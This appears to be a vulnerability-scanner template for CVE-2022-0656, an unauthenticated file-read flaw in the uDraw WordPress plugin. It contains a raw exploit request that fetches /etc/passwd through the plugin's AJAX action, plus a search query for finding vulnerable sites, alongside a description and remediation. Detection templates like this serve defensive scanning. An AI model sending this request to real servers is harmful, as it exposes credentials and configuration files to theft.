http:
- matchers:
  - condition: and
    type: word
    words:
    - cm9vd
    - data:image\/;base64
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest


    action=udraw_convert_url_to_base64&url=/etc/passwd

    '
id: CVE-2022-0656
info:
  author: akincibor
  classification:
    cpe: cpe:2.3:a:webtoprint:web_to_print_shop\:udraw:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0656
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-552
    epss-percentile: 0.98525
    epss-score: 0.68162
  description: uDraw before 3.3.3 does not validate the url parameter in its udraw_convert_url_to_base64
    AJAX action (available to both unauthenticated and authenticated users) before
    using it in the file_get_contents function and returning its content base64 encoded
    in the response. As a result, unauthenticated users could read arbitrary files
    on the web server (such as /etc/passwd, wp-config.php etc).
  impact: 'An attacker can exploit this vulnerability to access sensitive information,
    such as configuration files, credentials, or other sensitive data stored on the
    server.

    '
  metadata:
    google-query: inurl:"/wp-content/plugins/udraw"
    max-request: 1
    product: web_to_print_shop\
    vendor: webtoprint
    verified: true
  name: uDraw <3.3.3 - Local File Inclusion
  reference:
  - https://wpscan.com/vulnerability/925c4c28-ae94-4684-a365-5f1e34e6c151
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0656
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/cyllective/CVEs
  remediation: 'Upgrade uDraw to version 3.3.3 or later to mitigate the vulnerability.

    '
  severity: high
  tags: cve,cve2022,wp,wordpress,wp-plugin,unauth,lfi,udraw,wpscan,webtoprint,vkev,vuln
